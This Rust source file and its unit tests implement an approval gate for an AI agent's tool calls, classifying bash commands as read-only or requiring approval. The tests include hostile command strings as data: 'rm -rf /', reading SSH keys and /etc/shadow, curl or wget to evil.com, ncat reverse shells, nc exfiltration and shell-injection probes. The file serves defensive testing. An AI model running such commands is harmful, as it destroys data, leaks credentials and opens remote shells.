/// Returns [`None`] when the tool is not cloud-gated (treated as read-only for approval purposes).
/// Name-only variant: does not inspect arguments.
#[inline]
pub fn cloud_gated_tool_kind(name: &str) -> Option<CloudGatedToolKind> {
    cloud_gated_tool_kind_with_args(name, None)
}

/// Args-aware variant: for shell tools, inspects the `command` argument.
///
/// `bash "git status"` → `None` (read-only, no approval needed).
/// `bash "rm -rf /"` → `Some(Execute)` (mutating, approval required).
/// `bash` (no args) → `Some(Execute)` (fail-closed).
#[inline]
pub fn cloud_gated_tool_kind_with_args(
    name: &str,
    args: Option<&serde_json::Value>,
) -> Option<CloudGatedToolKind> {
    if name.starts_with("mcp_") {
        return Some(CloudGatedToolKind::Execute);
    }
    let classification = crate::tool::categories::classify(name, args);
    if !classification.approval_required {
        return None;
    }
    if classification.category.is_shell() {
        Some(CloudGatedToolKind::Execute)
    } else {
        Some(CloudGatedToolKind::Write)
    }
}

/// Returns true if `name` is in [`CLOUD_APPROVAL_REQUIRED_TOOLS`].
#[inline]
pub fn edge_tool_requires_cloud_approval(name: &str) -> bool {
    cloud_gated_tool_kind(name).is_some()
}

/// Args-aware variant: `bash "git status"` returns false (no approval).
#[inline]
pub fn edge_tool_requires_cloud_approval_with_args(
    name: &str,
    args: Option<&serde_json::Value>,
) -> bool {
    cloud_gated_tool_kind_with_args(name, args).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn each_listed_tool_requires_approval() {
        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
            assert!(
                edge_tool_requires_cloud_approval(name),
                "list entry must satisfy predicate: {name}"
            );
        }
    }

    #[test]
    fn read_only_tools_skip_approval_gate() {
        for name in ["read_file", "list_dir", "grep", "glob"] {
            assert!(
                !edge_tool_requires_cloud_approval(name),
                "{name} should not require cloud approval"
            );
        }
        let status_args = serde_json::json!({"action": "status"});
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "git",
            Some(&status_args)
        ));
    }

    #[test]
    fn unknown_tool_not_gated() {
        assert!(!edge_tool_requires_cloud_approval("made_up_tool"));
        assert!(!edge_tool_requires_cloud_approval(""));
    }

    #[test]
    fn list_is_sorted_for_stable_diffs() {
        let mut sorted = CLOUD_APPROVAL_REQUIRED_TOOLS.clone();
        sorted.sort_unstable();
        assert_eq!(
            *CLOUD_APPROVAL_REQUIRED_TOOLS, sorted,
            "CLOUD_APPROVAL_REQUIRED_TOOLS should stay sorted"
        );
    }

    #[test]
    fn execute_tools_sorted_and_subset_of_required() {
        let mut sorted = CLOUD_APPROVAL_EXECUTE_TOOLS.clone();
        sorted.sort_unstable();
        assert_eq!(
            *CLOUD_APPROVAL_EXECUTE_TOOLS, sorted,
            "CLOUD_APPROVAL_EXECUTE_TOOLS should stay sorted"
        );
        for &name in CLOUD_APPROVAL_EXECUTE_TOOLS.iter() {
            assert!(
                CLOUD_APPROVAL_REQUIRED_TOOLS.contains(&name),
                "{name} must appear in CLOUD_APPROVAL_REQUIRED_TOOLS"
            );
        }
    }

    #[test]
    fn required_tools_partition_into_execute_and_write() {
        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
            let kind = cloud_gated_tool_kind(name).expect("required tools must classify");
            match kind {
                CloudGatedToolKind::Execute => {
                    assert!(CLOUD_APPROVAL_EXECUTE_TOOLS.contains(&name));
                }
                CloudGatedToolKind::Write => {
                    assert!(!CLOUD_APPROVAL_EXECUTE_TOOLS.contains(&name));
                }
            }
        }
    }

    #[test]
    fn individual_tool_kind_classification() {
        // Write-gated tools
        for tool in &["git", "delete_file", "github"] {
            assert_eq!(
                cloud_gated_tool_kind(tool),
                Some(CloudGatedToolKind::Write),
                "{tool} must be write-gated"
            );
        }
        // Background task controls are not cloud-gated
        for tool in &["task_output", "task_list", "task_stop"] {
            assert_eq!(
                cloud_gated_tool_kind(tool),
                None,
                "{tool} must not be cloud-gated"
            );
        }
    }

    // ── bash_command_is_read_only tests ──

    #[test]
    fn bash_read_only_commands() {
        // Simple read-only commands
        assert!(bash_command_is_read_only("ls"));
        assert!(bash_command_is_read_only("ls -la"));
        assert!(bash_command_is_read_only("cat file.txt"));
        assert!(bash_command_is_read_only("head -n 10 file.txt"));
        assert!(bash_command_is_read_only("tail -f log.txt"));
        assert!(bash_command_is_read_only("sed -n '565,572p' file.rs"));
        assert!(bash_command_is_read_only("wc -l file.txt"));
        assert!(bash_command_is_read_only("pwd"));
        assert!(bash_command_is_read_only("whoami"));
        assert!(bash_command_is_read_only("date"));
        assert!(bash_command_is_read_only("date +%F"));
        assert!(bash_command_is_read_only("date -d yesterday +%F"));
        assert!(bash_command_is_read_only("hostname"));
        assert!(bash_command_is_read_only("hostname -f"));
        assert!(bash_command_is_read_only(r"echo \*"));
        assert!(bash_command_is_read_only(
            "echo \"reading artifact via introspect is not available as bash; using web_fetch again won't help. I'll note the key metadata.\""
        ));
        assert!(bash_command_is_read_only(
            "echo '$(rm -rf /); rm and git commit are literal prose'"
        ));
        assert!(bash_command_is_read_only(
            "echo \"rm file; literal prose is not a second command\""
        ));

        // Git read-only
        assert!(bash_command_is_read_only("git status"));
        assert!(bash_command_is_read_only("git log --oneline"));
        assert!(bash_command_is_read_only("git diff HEAD"));
        assert!(bash_command_is_read_only("git --no-pager diff HEAD"));
        assert!(bash_command_is_read_only("git show abc123"));
        assert!(bash_command_is_read_only("git branch -a"));
        assert!(bash_command_is_read_only("git ls-files"));

        // Search tools
        assert!(bash_command_is_read_only("grep -r pattern ."));
        assert!(bash_command_is_read_only("find . -name '*.rs'"));
        assert!(bash_command_is_read_only("rg pattern"));

        // Package metadata queries with no execution/fix behavior.
        assert!(bash_command_is_read_only("npm list"));
        assert!(bash_command_is_read_only(
            r#"cd /workspace/astra && grep -n "fn powershell\|fn bash_with_cancel\|execute_with_metadata_responsive" crates/astra-cli/src/edge_tools/shell.rs crates/astra-cli/src/cli/stream_render.rs"#
        ));
        assert!(bash_command_is_read_only(
            r#"grep -n "is_unsafe_bare_shell_prefix\|UNSAFE_SHELL\|is_dangerous_bash_allow_shape" crates/astra-cli/src/edge_tools/shell.rs | head -n 20"#
        ));

        // cd-prefixed commands
        assert!(bash_command_is_read_only("cd project && ls"));
        assert!(bash_command_is_read_only("cd /tmp && cat file.txt"));
        assert!(bash_command_is_read_only(
            "cd /repo && sed -n '1,20p' a.rs && echo '---' && sed -n '30,40p' b.rs"
        ));
        assert!(bash_command_is_read_only("cd /tmp"));
    }

    #[test]
    fn bash_write_commands_not_read_only() {
        // File operations
        assert!(!bash_command_is_read_only("rm file.txt"));
        assert!(!bash_command_is_read_only("mv a.txt b.txt"));
        assert!(!bash_command_is_read_only("cp a.txt b.txt"));
        assert!(!bash_command_is_read_only("mkdir dir"));
        assert!(!bash_command_is_read_only("touch file.txt"));
        assert!(!bash_command_is_read_only("sed -i 's/a/b/' file.rs"));
        assert!(!bash_command_is_read_only(
            "sort -o generated.txt input.txt"
        ));
        assert!(!bash_command_is_read_only(
            "sort --output=generated.txt input.txt"
        ));
        assert!(!bash_command_is_read_only(
            "sort --output generated.txt input.txt"
        ));
        assert!(!bash_command_is_read_only(
            "sort '-o' generated.txt input.txt"
        ));
        assert!(!bash_command_is_read_only(
            "env LC_ALL=C sort -o generated.txt input.txt"
        ));
        assert!(!bash_command_is_read_only("git branch new-feature"));
        assert!(!bash_command_is_read_only("git branch -d old-feature"));
        assert!(!bash_command_is_read_only(
            "git branch --color=never new-feature"
        ));
        assert!(!bash_command_is_read_only(
            "env GIT_CONFIG_NOSYSTEM=1 git branch new-feature"
        ));
        assert!(!bash_command_is_read_only("env python3 writer.py"));
        assert!(!bash_command_is_read_only("cd $(malicious)"));
        assert!(!bash_command_is_read_only("ls `malicious`"));
        assert!(bash_command_is_read_only("ls ; ls"));
        assert!(bash_command_is_read_only("ls\necho hi"));
        assert!(!bash_command_is_read_only("echo safe\ncustom_mutator"));
        assert!(!bash_command_is_read_only("echo safe & custom_mutator"));
        assert!(!bash_command_is_read_only("echo \"$(custom_mutator)\""));
        assert!(!bash_command_is_read_only("echo 'unterminated"));
        assert!(!bash_command_is_read_only("echo safe &&"));
        assert!(!bash_command_is_read_only("|| echo safe"));
        assert!(!bash_command_is_read_only("echo safe |"));
        assert!(!bash_command_is_read_only("find . -exec rm -rf {} +"));
        assert!(!bash_command_is_read_only("find . -exec touch /tmp/x {} +"));
        assert!(!bash_command_is_read_only("find . -delete"));
        assert!(!bash_command_is_read_only(
            "find . -type f -fprint /tmp/results"
        ));
        assert!(!bash_command_is_read_only(
            "rg --pre custom_decoder pattern"
        ));
        assert!(!bash_command_is_read_only(
            "rg --hostname-bin=custom pattern"
        ));
        assert!(!bash_command_is_read_only("fd --exec custom_mutator {}"));
        assert!(!bash_command_is_read_only("sed -n 'w /tmp/output' file"));
        assert!(!bash_command_is_read_only("git diff --output=/tmp/diff"));
        assert!(!bash_command_is_read_only(
            "sort --compress-program=custom_mutator input"
        ));
        assert!(!bash_command_is_read_only(r"find . -dele\te"));
        assert!(!bash_command_is_read_only("find . -{dele,dele}te"));
        assert!(!bash_command_is_read_only("find . -dele\\\nte"));
        assert!(!bash_command_is_read_only("find . -?xec rm -rf {} +"));
        assert!(!bash_command_is_read_only(
            "sort --o=/tmp/astra-write /dev/null"
        ));
        assert!(!bash_command_is_read_only("printf -v PATH /tmp/evil; ls"));
        assert!(!bash_command_is_read_only("tree -o output.txt"));
        assert!(!bash_command_is_read_only("uniq input.txt output.txt"));
        assert!(!bash_command_is_read_only("npm audit fix"));
        assert!(!bash_command_is_read_only("cargo clippy --fix"));
        assert!(!bash_command_is_read_only("cargo check"));
        assert!(!bash_command_is_read_only("env PATH=/tmp ls"));
        assert!(!bash_command_is_read_only(
            "env GIT_EXTERNAL_DIFF=custom_mutator git diff"
        ));
        assert!(!bash_command_is_read_only(
            "git diff --ext --no-index before after"
        ));
        assert!(!bash_command_is_read_only(
            "git diff --no-index before after"
        ));
        assert!(!bash_command_is_read_only("date -s tomorrow"));
        assert!(!bash_command_is_read_only("date --set=tomorrow"));
        assert!(!bash_command_is_read_only("date tomorrow"));
        assert!(!bash_command_is_read_only("hostname new-hostname"));
        assert!(!bash_command_is_read_only(
            "git diff --word-diff --output=/dev/null HEAD"
        ));
        assert!(!bash_command_is_read_only(
            "git log --notes --output=/dev/null"
        ));
        assert!(!bash_command_is_read_only(
            "git stash list --output=/dev/null"
        ));
        assert!(!bash_command_is_read_only(
            "git diff --unified --output=/dev/null HEAD"
        ));
        assert!(!bash_command_is_read_only(
            "git diff -U --output=/dev/null HEAD"
        ));
        assert!(!bash_command_is_read_only(
            "git log --pretty --output=/dev/null"
        ));
        assert!(!bash_command_is_read_only("sort {{input},-oout}"));
        assert!(!bash_command_is_read_only("'cat file'"));
        assert!(!bash_command_is_read_only("'git status'"));
        assert!(!bash_command_is_read_only("git remote set-url origin x"));
        assert!(!bash_command_is_read_only("git tag release"));

        // Git write operations
        assert!(!bash_command_is_read_only("git add ."));
        assert!(!bash_command_is_read_only("git commit -m 'msg'"));
        assert!(!bash_command_is_read_only("git push origin main"));
        assert!(!bash_command_is_read_only("git checkout main"));
        assert!(!bash_command_is_read_only("git reset --hard"));

        // Output redirection
        assert!(!bash_command_is_read_only("ls > output.txt"));
        assert!(!bash_command_is_read_only("echo hello >> file.txt"));

        // Package installation
        assert!(!bash_command_is_read_only("npm install package"));
        assert!(!bash_command_is_read_only("pip install package"));
        assert!(!bash_command_is_read_only("cargo build"));

        // Dangerous commands
        assert!(!bash_command_is_read_only("sudo rm -rf /"));
        assert!(!bash_command_is_read_only("eval 'echo bad'"));
    }

    #[test]
    fn dual_state_read_families_keep_observation_forms_read_only() {
        for command in [
            "sort input.txt",
            "sort -n input.txt",
            "sort -k2 input.txt",
            "tree -L2 .",
            "uniq -f1 input.txt",
            "git branch",
            "git branch --list 'feature/*'",
            "git branch --show-current",
            "env",
            "env LC_ALL=C",
            "env LC_ALL=C sort -n input.txt",
            "env --ignore-environment git branch --list 'feature/*'",
        ] {
            assert!(bash_command_is_read_only(command), "command: {command}");
        }
    }

    #[test]
    fn argument_sensitive_families_never_use_the_generic_allowlist() {
        // Each family below has at least one state-changing form. Keeping it
        // out of SIMPLE_READ_ONLY_COMMANDS makes the specialized validator a
        // structural requirement rather than an ordering accident.
        for command in ["sort", "tree", "file", "printf", "uniq", "date", "hostname"] {
            assert!(
                !SIMPLE_READ_ONLY_COMMANDS.contains(&command),
                "{command} must remain argument-aware"
            );
        }

        for (safe, rejected) in [
            ("sort input.txt", "sort -o output.txt input.txt"),
            ("tree -L 2 .", "tree -o output.txt ."),
            ("file input.txt", "file --unknown-option input.txt"),
            ("printf '%s' value", "printf -v PATH /tmp/evil"),
            ("uniq input.txt", "uniq input.txt output.txt"),
            ("date +%s", "date --set=tomorrow"),
            ("hostname -f", "hostname replacement-name"),
        ] {
            assert!(bash_command_is_read_only(safe), "safe form: {safe}");
            assert!(
                !bash_command_is_read_only(rejected),
                "state-changing or unverifiable form: {rejected}"
            );
        }
    }

    #[test]
    fn runtime_dependent_expansions_require_approval() {
        for command in [
            "find . -$ACTION",
            "find . -${ACTION}",
            "sort $ARGS input.txt",
            "printf $FORMAT payload",
            "echo \"$HOME\"",
            "echo prefix$HOME",
            "echo $((1 + 2))",
            "echo $((value))",
            "echo $((array[$(touch /tmp/astra-arithmetic-injection)]))",
        ] {
            assert_eq!(
                bash_command_approval_reason(command),
                Some(BashApprovalReason::ShellInjection),
                "command: {command}"
            );
        }
    }

    #[test]
    fn bash_pipe_to_dangerous_commands() {
        assert!(!bash_command_is_read_only("ls | tee output.txt"));
        assert!(!bash_command_is_read_only("echo test | xargs rm"));
        assert!(!bash_command_is_read_only("cat script.sh | bash"));
        assert!(!bash_command_is_read_only(
            "cargo check 2>&1 | tee build.log"
        ));
        // Regression for the compound-parsing unification: an unsafe step on
        // the RHS of a pipe must still mark the chain as approval-required.
        assert!(!bash_command_is_read_only("ls | rm -rf /"));
        assert!(!bash_command_is_read_only("git status | sh"));
    }

    #[test]
    fn bash_empty_command() {
        assert!(!bash_command_is_read_only(""));
        assert!(!bash_command_is_read_only("   "));
    }

    #[test]
    fn bash_unknown_commands_not_read_only() {
        // Unknown commands should require approval (conservative)
        assert!(!bash_command_is_read_only("custom_script.sh"));
        assert!(!bash_command_is_read_only("./run.sh"));
        assert!(!bash_command_is_read_only("make"));
        assert!(!bash_command_is_read_only("docker run image"));
    }

    // ── MCP permission gating tests ──

    #[test]
    fn mcp_tools_require_approval() {
        assert!(edge_tool_requires_cloud_approval("mcp_filesystem_read"));
        assert!(edge_tool_requires_cloud_approval("mcp_github_search"));
        assert!(edge_tool_requires_cloud_approval(
            "mcp_custom_server_do_stuff"
        ));
    }

    #[test]
    fn mcp_tools_classified_as_execute() {
        assert_eq!(
            cloud_gated_tool_kind("mcp_anything"),
            Some(CloudGatedToolKind::Execute),
        );
        assert_eq!(
            cloud_gated_tool_kind("mcp_server_tool"),
            Some(CloudGatedToolKind::Execute),
        );
    }

    #[test]
    fn non_mcp_unknown_tool_not_gated() {
        assert!(!edge_tool_requires_cloud_approval("mcp"));
        assert!(!edge_tool_requires_cloud_approval("my_mcp_tool"));
    }

    /// Regression: every benign fd redirect pattern in
    /// `strip_benign_fd_redirects` must keep the command read-only. Twin of
    /// keep the two corpora aligned.
    #[test]
    fn benign_fd_redirect_handling() {
        // ── Basic fd redirects are read-only ──
        for cmd in &[
            "rg pattern 2>&1",
            "rg pattern 1>&2",
            "rg pattern 2>/dev/null",
            "rg pattern 1>/dev/null",
            "rg pattern >/dev/null",
            "rg pattern &>/dev/null",
            "rg pattern 2>&1 | head -50",
        ] {
            assert!(
                bash_command_is_read_only(cmd),
                "expected read-only: {cmd:?}"
            );
        }

        // Redirecting into an ordinary file is a write. Only fd forwarding
        // and explicit /dev/null disposal are approval-free.
        for cmd in &[
            "cargo check &>> /tmp/rm_me.log",
            "cargo check &>> /var/log/mv_state",
            "cargo check &>> ./cp_backup.log",
            "cargo check &> /tmp/chmod.out",
            "cargo check 2> /tmp/git_commit_trace.log",
            "cargo check &>> /tmp/rm_me.log && echo done",
            "cargo check &>> /tmp/日志.log",
        ] {
            assert!(
                !bash_command_is_read_only(cmd),
                "expected file-writing redirect: {cmd:?}"
            );
        }
        // Malformed dangling redirect must trigger mutation scan (fail-closed)
        assert!(!bash_command_is_read_only("cargo check 2>"));

        // ── Left token boundary requirement ──
        assert!(!bash_command_is_read_only("echo a2>/tmp/x"));
        assert!(!bash_command_is_read_only("echo a2>>/tmp/x"));
        assert!(!bash_command_is_read_only("cargo check 2>/dev/nullx"));
        assert!(bash_command_is_read_only("echo '2>/dev/null'"));
        for cmd in &[
            "cargo check 2>/tmp/log",
            "2>/tmp/log cargo check",
            "true | 2>/tmp/log cargo check",
        ] {
            assert!(
                !bash_command_is_read_only(cmd),
                "expected file-writing redirect: {cmd:?}"
            );
        }
    }

    // ── bash_command_approval_reason tests (TDD for rationale surfacing) ──

    #[test]
    fn approval_reason_basics() {
        // Read-only commands return None
        for cmd in &["ls -la", "rg pattern 2>&1 | head", "git status"] {
            assert_eq!(
                bash_command_approval_reason(cmd),
                None,
                "{cmd:?} should have no approval reason"
            );
        }
        // Empty / whitespace-only → Empty
        for cmd in &["", "   "] {
            assert_eq!(
                bash_command_approval_reason(cmd),
                Some(BashApprovalReason::Empty)
            );
        }
        // Shell injection vectors
        for cmd in &["echo $(rm -rf /)", "echo `rm -rf /`"] {
            assert_eq!(
                bash_command_approval_reason(cmd),
                Some(BashApprovalReason::ShellInjection),
                "{cmd:?} must surface ShellInjection"
            );
        }
        assert_eq!(
            bash_command_approval_reason("ls; rm foo"),
            Some(BashApprovalReason::WriteIndicator("rm ".to_string()))
        );
        // display() is non-empty for all variants
        for v in [
            BashApprovalReason::Empty,
            BashApprovalReason::ShellInjection,
            BashApprovalReason::WriteIndicator(">".to_string()),
            BashApprovalReason::UnknownPrefix("foobar".to_string()),
        ] {
            assert!(
                !v.display().is_empty(),
                "display() must be non-empty for {v:?}"
            );
        }
    }

    /// Write indicators must surface the matched token and its humanized display.
    /// Unknown-prefix commands must name the first token with risk-framed display.
    #[test]
    fn approval_reason_ux_contracts() {
        // ── WriteIndicator: names the matched token ──
        let reason = bash_command_approval_reason("rm -rf /tmp/foo");
        match &reason {
            Some(BashApprovalReason::WriteIndicator(ind)) => {
                assert!(
                    !ind.is_empty(),
                    "write indicator must carry the matched token"
                );
                assert!(
                    ind.trim() == "rm" || ind.starts_with("rm"),
                    "expected `rm` indicator, got {ind:?}"
                );
            }
            other => panic!("expected WriteIndicator, got {other:?}"),
        }
        let display = reason.unwrap().display();
        assert!(
            display.contains("rm"),
            "display must cite raw token: {display}"
        );
        assert!(
            !display.contains("write indicator"),
            "display must not leak jargon: {display}"
        );

        // ── WriteIndicator display: humanized per-indicator phrases ──
        let indicator_cases = [
            (">", "writes to a file"),
            (">>", "appends to a file"),
            ("rm ", "deletes files"),
            ("mv ", "moves or renames files"),
            ("sed -i", "edits files in place"),
            ("chmod ", "changes file permissions"),
            ("npm install", "installs packages"),
        ];
        for (ind, expected_phrase) in indicator_cases {
            let d = BashApprovalReason::WriteIndicator(ind.to_string()).display();
            assert!(
                d.contains(expected_phrase),
                "WriteIndicator({ind:?}) missing {expected_phrase:?}: {d:?}"
            );
            assert!(
                d.contains(ind.trim()),
                "WriteIndicator display must cite raw token `{ind}`: {d:?}"
            );
        }

        // ── UnknownPrefix: names the first token ──
        assert_eq!(
            bash_command_approval_reason("foobar --flag"),
            Some(BashApprovalReason::UnknownPrefix("foobar".to_string()))
        );
        match bash_command_approval_reason("cat file | foobar") {
            Some(BashApprovalReason::UnknownPrefix(tok)) => assert_eq!(tok, "foobar"),
            other => panic!("expected UnknownPrefix(foobar), got {other:?}"),
        }

        // ── UnknownPrefix display: risk-framed, not allowlist jargon ──
        let ux_display = BashApprovalReason::UnknownPrefix("foobar".to_string()).display();
        assert!(
            ux_display.contains("foobar"),
            "display must cite unknown token: {ux_display}"
        );
        let lower = ux_display.to_lowercase();
        assert!(
            lower.contains("modify") || lower.contains("unrecognized") || lower.contains("unknown"),
            "display should frame as risk/unknown, not allowlist: {ux_display}"
        );
        assert!(
            !ux_display.contains("allowlist"),
            "display must not leak allowlist jargon: {ux_display}"
        );
    }

    /// The `display()` method must produce non-empty, human-readable text
    /// for every variant (the CLI appends this directly to the approval
    /// banner; a blank string would be a silent UX regression).
    #[test]
    fn approval_reason_display_is_non_empty_for_all_variants() {
        let variants = [
            BashApprovalReason::Empty,
            BashApprovalReason::ShellInjection,
            BashApprovalReason::WriteIndicator(">".to_string()),
            BashApprovalReason::UnknownPrefix("foobar".to_string()),
        ];
        for v in variants {
            let s = v.display();
            assert!(!s.is_empty(), "display() must be non-empty for {v:?}");
        }
    }

    /// Residual-risk guard: malformed trailing redirect (`cmd 2>` / `cmd >`
    /// with no target) MUST fall back to conservative mutation classification
    /// — shell itself errors on dangling redirects, so we prefer false-
    /// positive approval over silent miss. Twin of
    /// `astra_runtime::bash_intent::malformed_trailing_redirect_stays_conservative`;
    /// if you change this, change both sides.
    #[test]
    fn malformed_trailing_redirect_stays_conservative() {
        assert!(!bash_command_is_read_only("cargo check 2>"));
        assert!(!bash_command_is_read_only("cargo check >"));
        assert!(!bash_command_is_read_only("cargo check 2>>"));
        // Bash combined redirect variants must also fall back to mutating
        // when dangling. Previously `.replace("&>", " ")` silently ate the
        // operator and made `cargo check &>` look read-only.
        assert!(!bash_command_is_read_only("cargo check &>"));
        assert!(!bash_command_is_read_only("cargo check &>>"));
    }
    // ── Args-aware cloud approval tests ──

    #[test]
    fn bash_args_aware_approval() {
        // (command, requires_approval, expected_kind)
        let cases: &[(&str, bool, Option<CloudGatedToolKind>)] = &[
            ("git status", false, None),
            ("ls -la", false, None),
            ("rg pattern 2>&1 | head -50", false, None),
            ("rm -rf /", true, Some(CloudGatedToolKind::Execute)),
            ("git push origin main", true, None), // None = don't check kind
            ("", true, None),
        ];
        for (cmd, requires, expected_kind) in cases {
            let args = serde_json::json!({"command": cmd});
            let result = edge_tool_requires_cloud_approval_with_args("bash", Some(&args));
            assert_eq!(
                result, *requires,
                "bash {cmd:?}: requires_approval mismatch"
            );
            if let Some(kind) = expected_kind {
                assert_eq!(
                    cloud_gated_tool_kind_with_args("bash", Some(&args)),
                    Some(*kind),
                    "bash {cmd:?}: kind mismatch"
                );
            }
        }
        // No args → requires approval with Execute kind
        assert!(edge_tool_requires_cloud_approval_with_args("bash", None));
        assert_eq!(
            cloud_gated_tool_kind_with_args("bash", None),
            Some(CloudGatedToolKind::Execute)
        );
    }

    #[test]
    fn args_aware_non_bash_tools() {
        let file_args = serde_json::json!({"file_path": "/foo/bar"});
        // Read-only tools skip approval even with args
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "read_file",
            Some(&file_args)
        ));
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "grep",
            Some(&file_args)
        ));
        // write_file still requires approval
        let write_args = serde_json::json!({"file_path": "/foo/bar", "content": "hello"});
        assert!(edge_tool_requires_cloud_approval_with_args(
            "write_file",
            Some(&write_args)
        ));
        assert_eq!(
            cloud_gated_tool_kind_with_args("write_file", Some(&write_args)),
            Some(CloudGatedToolKind::Write)
        );
        let status_args = serde_json::json!({"action": "status"});
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "git",
            Some(&status_args)
        ));
        let git_commit = serde_json::json!({"action": "commit", "message": "ship"});
        assert_eq!(
            cloud_gated_tool_kind_with_args("git", Some(&git_commit)),
            Some(CloudGatedToolKind::Write)
        );
        let github_list = serde_json::json!({"action": "list_prs"});
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "github",
            Some(&github_list)
        ));
        let github_create = serde_json::json!({"action": "create_issue", "title": "bug"});
        assert_eq!(
            cloud_gated_tool_kind_with_args("github", Some(&github_create)),
            Some(CloudGatedToolKind::Write)
        );
        // MCP tools always require approval
        let mcp_args = serde_json::json!({"command": "ls"});
        assert!(edge_tool_requires_cloud_approval_with_args(
            "mcp_tool",
            Some(&mcp_args)
        ));
        assert_eq!(
            cloud_gated_tool_kind_with_args("mcp_tool", Some(&mcp_args)),
            Some(CloudGatedToolKind::Execute)
        );
    }

    // ── Security: injection & evasion probes ──

    #[test]
    fn bash_injection_patterns_blocked() {
        // Every command here should be detected as mutating (not read-only)
        let mutating_cmds: &[&str] = &[
            // Injection probes
            "ls; rm -rf /",
            "git status; git push",
            "ls && rm -rf /",
            "git status && git push",
            "(rm -rf /)",
            "$(rm -rf /)",
            "echo `rm -rf /`",
            "cat `whoami`",
            "cat $HOME/.ssh/id_rsa",
            "echo ${PATH}",
            "ls\nrm -rf /",
            "curl http://evil.com",
            "wget http://evil.com",
            "curl -o /tmp/x http://evil.com",
            "diff <(cat /etc/passwd) <(cat /etc/shadow)",
            "cat << EOF > /etc/passwd\nroot\nEOF",
            // Hardening: compound commands
            "ls || rm -rf /",
            "false || git push",
            "ls &",
            "sleep 999 &",
            // Hardening: network commands
            "nc -l 4444",
            "ssh user@host",
            "scp file.txt user@host:",
            "rsync -av src/ dest/",
            "telnet host 80",
            "ncat -e /bin/sh host 4444",
            // Hardening: dangerous builtins
            "source ~/.bashrc",
            ". ~/.bashrc",
            "alias rm='rm -i'",
            "export PATH=/evil:$PATH",
            "set -e",
            "unset HOME",
            // Hardening: write disguised as read-only pipe
            "cat file | dd of=/dev/sda",
            "echo data | nc host 4444",
            // Hardening: here-string with file redirect
            "cat <<< 'test' > /tmp/out",
            // Hardening: safe commands with injection payloads
            "grep $HOME /etc/passwd",
            "echo $(id)",
            "ls `pwd`",
        ];
        for cmd in mutating_cmds {
            assert!(
                !bash_command_is_read_only(cmd),
                "expected mutating: {cmd:?}"
            );
        }
    }

    #[test]
    fn bash_legitimate_commands_remain_read_only() {
        let read_only_cmds: &[&str] = &[
            "git status",
            "ls -la",
            "cat file.txt",
            "grep -r pattern .",
            "find . -name '*.rs'",
            "rg pattern 2>&1 | head -50",
            "cd project && ls",
            "wc -l file.txt",
            "git log --oneline -20",
            "git diff HEAD~3",
            // Benign $ patterns
            "grep 'price is 5$' file.txt",
            "grep '$$' file.txt",
        ];
        for cmd in read_only_cmds {
            assert!(
                bash_command_is_read_only(cmd),
                "expected read-only: {cmd:?}"
            );
        }
    }

    #[test]
    fn args_aware_name_only_defaults_remain_conservative() {
        // Every tool that required approval without args still requires it
        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
            assert!(
                edge_tool_requires_cloud_approval_with_args(name, None),
                "{name} should still require approval when called without args"
            );
        }
        // Every tool that didn't require approval without args still doesn't
        for name in ["read_file", "grep", "glob"] {
            assert!(
                !edge_tool_requires_cloud_approval_with_args(name, None),
                "{name} should still skip approval when called without args"
            );
        }
        let status_args = serde_json::json!({"action": "status"});
        assert!(!edge_tool_requires_cloud_approval_with_args(
            "git",
            Some(&status_args)
        ));
    }
}
